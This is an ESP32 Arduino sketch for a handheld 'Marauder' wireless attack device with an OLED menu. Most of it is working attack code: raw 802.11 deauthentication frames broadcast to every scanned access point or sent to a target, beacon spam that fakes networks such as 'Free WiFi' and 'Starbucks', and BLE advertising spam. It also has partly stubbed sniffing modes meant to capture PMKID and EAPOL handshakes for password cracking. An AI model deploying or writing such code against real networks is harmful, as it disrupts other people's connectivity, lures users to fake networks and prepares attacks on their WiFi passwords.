/*
 * ======================================================================================
 * ESP32 MARAUDER - ULTIMATE ALL-IN-ONE
 * ======================================================================================
 * READ THIS CAREFULLY OR THE CODE WILL NOT COMPILE:
 * 
 * 1. PARTITION SCHEME REQUIREMENT:
 *    This sketch contains both full WiFi and Bluetooth support. The default ESP32 
 *    partition scheme (1.3MB APP) is TOO SMALL.
 *    
 *    You MUST go to Tools -> Partition Scheme -> Select "Huge APP (3MB No OTA/1MB SPIFFS)"
 *    
 * 2. LIBRARIES:
 *    Ensure you have "Adafruit SSD1306" and "Adafruit GFX" installed via Library Manager.
 *    
 * 3. CRITICAL ERROR FIX ("Multiple libraries found for BLEDevice.h"):
 *    If you get "redefinition" or "getAdvertising is not a member" errors, it means
 *    you have the "ArduinoBLE" library installed. 
 *    YOU MUST UNINSTALL "ArduinoBLE" or delete it from your libraries folder.
 *    The ESP32 has its own native BLE library that this code requires.
 * 
 * ======================================================================================
 */

#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// --- CONFIGURATION ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_MOSI 23
#define OLED_CLK  18
#define OLED_DC   17
#define OLED_CS   5
#define OLED_RST  16

#define JOY_X     36
#define JOY_Y     39
// NOTE: GPIO34-39 are input-only and don't support internal pull-ups.
// Changed to GPIO26 which supports INPUT_PULLUP for reliable button detection.
// If using original GPIO34, an external pull-up resistor (10kΩ to 3.3V) is required.
#define JOY_SW    26

#define MAX_APS 100
#define SERIAL_SPEED 115200

// --- GLOBALS ---
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &SPI, OLED_DC, OLED_RST, OLED_CS);
BLEScan* pBLEScan;

struct APInfo {
  String ssid;
  int rssi;
  uint8_t channel;
  uint8_t bssid[6];
};

APInfo ap_list[MAX_APS];
int ap_count = 0;
int current_menu_index = 0;

// --- MENU DEFINITIONS ---
const char* menu_items[] = {
  "WiFi Scan AP",
  "WiFi Scan Station",
  "WiFi Deauth BCR",
  "WiFi Deauth Target",
  "Beacon Spam List",
  "Beacon Spam Rand",
  "Rickroll Beacons",
  "Probe Spam",
  "BLE Scan",
  "BT Classic Scan",
  "BLE Advertising",
  "Raw Sniffing",
  "Capture PMKID",
  "Capture EAPOL",
  "Reboot System"
};
const int menu_count = sizeof(menu_items) / sizeof(menu_items[0]);

// --- PACKET TEMPLATES ---
uint8_t deauth_template[] = { 
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x07, 0x00 
};

uint8_t beacon_template[] = { 
  0x80, 0x00, 0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 
  0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x64, 0x00, 0x11, 0x00, 0x00, 
  0x00, 0x00 
};

// --- FORWARD DECLARATIONS ---
void wifi_scan_aps();
void wifi_scan_stations();
void wifi_deauth_broadcast();
void wifi_deauth_target(uint8_t* mac);
void wifi_beacon_spam_list();
void wifi_beacon_spam_random();
void wifi_rickroll();
void wifi_probe_spam();
void bluetooth_ble_scan();
void bluetooth_bt_classic_scan();
void bluetooth_ble_spam();
void sniffing_start_raw_capture();
void sniffing_capture_pmkid();
void sniffing_capture_eapol();
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type);

// --- WIFI TOOLS ---
void wifi_send_packet(uint8_t* buf, int len, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
}

void wifi_scan_aps() {
  Serial.println(F("Starting AP Scan..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("Scanning APs..."));
  display.display();
  
  ap_count = WiFi.scanNetworks(false, true, false, 100);
  for (int i = 0; i < ap_count && i < MAX_APS; i++) {
    ap_list[i].ssid = WiFi.SSID(i);
    ap_list[i].rssi = WiFi.RSSI(i);
    ap_list[i].channel = WiFi.channel(i);
    memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
  }
  
  // Display results
  display.clearDisplay();
  display.setCursor(0, 0);
  display.print(F("Found: "));
  display.print(ap_count);
  display.println(F(" APs"));
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Show first few APs
  for (int i = 0; i < min(4, ap_count); i++) {
    display.setCursor(0, 14 + i * 12);
    display.print(ap_list[i].ssid.substring(0, 14));
    display.print(F(" "));
    display.print(ap_list[i].rssi);
  }
  display.display();
  Serial.print(F("Found "));
  Serial.print(ap_count);
  Serial.println(F(" APs"));
}

void wifi_scan_stations() {
  Serial.println(F("Starting Station Scan..."));
  Serial.println(F("Enabling promiscuous mode for station detection"));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("STATION SCAN"));
  display.println(F("Promiscuous mode"));
  display.println(F("enabled. Check"));
  display.println(F("Serial for clients"));
  display.display();
  esp_wifi_set_promiscuous(true);
  // Station detection happens in sniffer_callback
}

void wifi_deauth_broadcast() {
  Serial.println(F("Executing Deauth Broadcast..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("DEAUTH BROADCAST"));
  display.print(F("Targeting: "));
  display.print(ap_count);
  display.println(F(" APs"));
  display.display();
  
  if (ap_count == 0) {
    display.println(F("No APs! Scan first"));
    display.display();
    Serial.println(F("No APs scanned. Run WiFi Scan AP first."));
    return;
  }
  
  for (int i = 0; i < ap_count; i++) {
    memcpy(deauth_template + 10, ap_list[i].bssid, 6);
    memcpy(deauth_template + 16, ap_list[i].bssid, 6);
    for (int j = 0; j < 5; j++) {
      wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[i].channel);
      delay(1);
    }
  }
  display.println(F("Deauth sent!"));
  display.display();
}

void wifi_deauth_target(uint8_t* mac) {
  Serial.println(F("Executing Targeted Deauth..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("TARGETED DEAUTH"));
  display.display();
  
  if (ap_count > 0) {
     memcpy(deauth_template + 4, mac, 6);
     memcpy(deauth_template + 10, ap_list[0].bssid, 6);
     memcpy(deauth_template + 16, ap_list[0].bssid, 6);
     wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[0].channel);
     display.println(F("Deauth sent to"));
     display.println(ap_list[0].ssid.substring(0, 16));
     display.display();
  }
}

void wifi_beacon_spam_custom(const char* ssid) {
  uint8_t packet[128];
  int ssid_len = strlen(ssid);
  if(ssid_len > 32) ssid_len = 32;
  
  memcpy(packet, beacon_template, sizeof(beacon_template));
  packet[37] = ssid_len;
  memcpy(packet + 38, ssid, ssid_len);
  
  // Random BSSID/Src
  for (int i = 10; i < 16; i++) packet[i] = random(0, 256);
  memcpy(packet + 16, packet + 10, 6);
  
  wifi_send_packet(packet, 38 + ssid_len, random(1, 14));
}

void wifi_beacon_spam_list() {
  Serial.println(F("Beacon Spam (List)..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("BEACON SPAM"));
  display.println(F("Broadcasting:"));
  display.display();
  
  const char* ssids[] = {"Free WiFi", "Starbucks", "xfinity", "Marauder_Ghst"};
  for (int i = 0; i < 4; i++) {
    display.println(ssids[i]);
    display.display();
    wifi_beacon_spam_custom(ssids[i]);
    delay(10);
  }
}

void wifi_beacon_spam_random() {
  Serial.println(F("Beacon Spam (Random)..."));
  String rs = "WiFi-" + String(random(1000, 9999));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("RANDOM BEACON"));
  display.println(F("Broadcasting:"));
  display.println(rs);
  display.display();
  wifi_beacon_spam_custom(rs.c_str());
}

void wifi_rickroll() {
  Serial.println(F("Rickroll Beacon Spam..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("RICKROLL"));
  display.println(F("Broadcasting:"));
  display.display();
  const char* lyrics[] = {"Never Gonna", "Give You Up", "Never Gonna", "Let You Down"};
  for (int i = 0; i < 4; i++) {
    wifi_beacon_spam_custom(lyrics[i]);
    delay(50);
  }
}

void wifi_probe_spam() {
  Serial.println(F("Probe Spam..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("PROBE SPAM"));
  display.println(F("Sending probes..."));
  display.println(F("(placeholder)"));
  display.display();
  // TODO: Implement probe request spam
}

// --- BLUETOOTH TOOLS ---
void bluetooth_ble_scan() {
  Serial.println(F("Starting BLE Scan..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("BLE Scanning..."));
  display.println(F("(5 seconds)"));
  display.display();
  
  BLEScanResults foundDevices = pBLEScan->start(5, false);
  int count = foundDevices.getCount();
  
  display.clearDisplay();
  display.setCursor(0, 0);
  display.print(F("Found: "));
  display.print(count);
  display.println(F(" devices"));
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Show first few devices
  for (int i = 0; i < min(4, count); i++) {
    BLEAdvertisedDevice device = foundDevices.getDevice(i);
    display.setCursor(0, 14 + i * 12);
    if (device.haveName()) {
      display.print(device.getName().substring(0, 16).c_str());
    } else {
      display.print(F("[Unknown]"));
    }
  }
  display.display();
  Serial.print(F("Found "));
  Serial.print(count);
  Serial.println(F(" BLE devices"));
  pBLEScan->clearResults();
}

void bluetooth_bt_classic_scan() {
  Serial.println(F("BT Classic Scan (Stub)..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("BT CLASSIC SCAN"));
  display.println(F("Not implemented"));
  display.println(F("ESP32 BT Classic"));
  display.println(F("requires extra"));
  display.println(F("configuration"));
  display.display();
}

void bluetooth_ble_spam() {
  Serial.println(F("Starting BLE Spam..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("BLE ADVERTISING"));
  display.println(F("Broadcasting:"));
  display.println(F("Marauder-Spam"));
  display.display();
  
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData oAdvertisementData;
  oAdvertisementData.setFlags(0x06); 
  oAdvertisementData.setName("Marauder-Spam");
  pAdvertising->setAdvertisementData(oAdvertisementData);
  pAdvertising->start();
  delay(100);
  pAdvertising->stop();
  
  display.println(F("Done!"));
  display.display();
}

// --- SNIFFER ---
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  // Check for EAPOL
  if (len > 34 && payload[32] == 0x88 && payload[33] == 0x8e) {
    Serial.print(F("EAPOL detected!"));
  }
}

void sniffing_start_raw_capture() {
  Serial.println(F("Raw Capture Started..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("RAW SNIFFING"));
  display.println(F("Active..."));
  display.println(F("Check Serial for"));
  display.println(F("captured packets"));
  display.display();
  esp_wifi_set_promiscuous(true);
}

void sniffing_capture_pmkid() {
  Serial.println(F("PMKID Capture..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("PMKID CAPTURE"));
  display.println(F("Listening..."));
  display.println(F("Check Serial for"));
  display.println(F("PMKID hashes"));
  display.display();
  esp_wifi_set_promiscuous(true);
}

void sniffing_capture_eapol() {
  Serial.println(F("EAPOL Capture..."));
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("EAPOL CAPTURE"));
  display.println(F("Listening..."));
  display.println(F("Check Serial for"));
  display.println(F("handshakes"));
  display.display();
  esp_wifi_set_promiscuous(true);
}

// --- UI FUNCTIONS ---
void ui_draw_menu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header
  display.setCursor(10, 0);
  display.println(F("MARAUDER MENU"));
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Menu items
  for (int i = 0; i < 5; i++) {
    int idx = (current_menu_index + i) % menu_count;
    display.setCursor(0, 14 + i * 10);
    if (i == 0) {
      display.fillRect(0, 13, SCREEN_WIDTH, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.print(F(" "));
    display.println(menu_items[idx]);
  }
  display.setTextColor(SSD1306_WHITE);
  display.display();
}

void ui_select_item() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header
  display.setCursor(20, 0);
  display.println(F("RUNNING..."));
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Selected item
  display.setCursor(0, 26);
  display.println(menu_items[current_menu_index]);
  display.display();
  
  switch (current_menu_index) {
    case 0: wifi_scan_aps(); break;
    case 1: wifi_scan_stations(); break;
    case 2: wifi_deauth_broadcast(); break;
    case 3: 
        if(ap_count > 0) wifi_deauth_target(ap_list[0].bssid); 
        else Serial.println(F("No APs to target"));
        break;
    case 4: wifi_beacon_spam_list(); break;
    case 5: wifi_beacon_spam_random(); break;
    case 6: wifi_rickroll(); break;
    case 7: wifi_probe_spam(); break;
    case 8: bluetooth_ble_scan(); break;
    case 9: bluetooth_bt_classic_scan(); break;
    case 10: bluetooth_ble_spam(); break;
    case 11: sniffing_start_raw_capture(); break;
    case 12: sniffing_capture_pmkid(); break;
    case 13: sniffing_capture_eapol(); break;
    case 14: ESP.restart(); break;
  }
  
  delay(1500); // Pause to let user see "Run: ..."
  ui_draw_menu();
}

// --- MAIN SETUP & LOOP ---
void setup() {
  Serial.begin(SERIAL_SPEED);
  
  // Joystick Button Input - Use INPUT_PULLUP for reliable detection
  // Button reads LOW when pressed, HIGH when released
  pinMode(JOY_SW, INPUT_PULLUP);
  
  // OLED Init
  if(!display.begin(SSD1306_SWITCHCAPVCC)) { 
    Serial.println(F("OLED Init Failed")); 
    for(;;); 
  }
  
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 20);
  display.println(F("MARAUDER"));
  display.setTextSize(1);
  display.setCursor(10, 45);
  display.println(F("ULTIMATE"));
  display.display();
  delay(2000);

  // WiFi Init
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  
  // BLE Init
  BLEDevice::init("Marauder");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  
  ui_draw_menu();
  Serial.println(F("System Ready."));
}

void loop() {
  // Joystick Simulation / Serial Control
  if (Serial.available()) {
    char c = Serial.read();
    if (c == 'n') { // NEXT
      current_menu_index = (current_menu_index + 1) % menu_count;
      ui_draw_menu();
    }
    if (c == 'p') { // PREVIOUS
      current_menu_index--;
      if(current_menu_index < 0) current_menu_index = menu_count - 1;
      ui_draw_menu();
    }
    if (c == 's') { // SELECT
      ui_select_item();
    }
  }
  
  // Real Joystick Logic (If connected)
  int yVal = analogRead(JOY_Y);
  int swVal = digitalRead(JOY_SW);
  static unsigned long last_input = 0;
  static unsigned long last_btn = 0;
  
  if (millis() - last_input > 200) {
    if (yVal < 1000) { // UP
       current_menu_index--;
       if(current_menu_index < 0) current_menu_index = menu_count - 1;
       ui_draw_menu();
       last_input = millis();
    }
    else if (yVal > 3000) { // DOWN
       current_menu_index = (current_menu_index + 1) % menu_count;
       ui_draw_menu();
       last_input = millis();
    }
  }
  
  // Joystick button press (active LOW)
  if (swVal == LOW && millis() - last_btn > 300) {
    ui_select_item();
    last_btn = millis();
  }
}
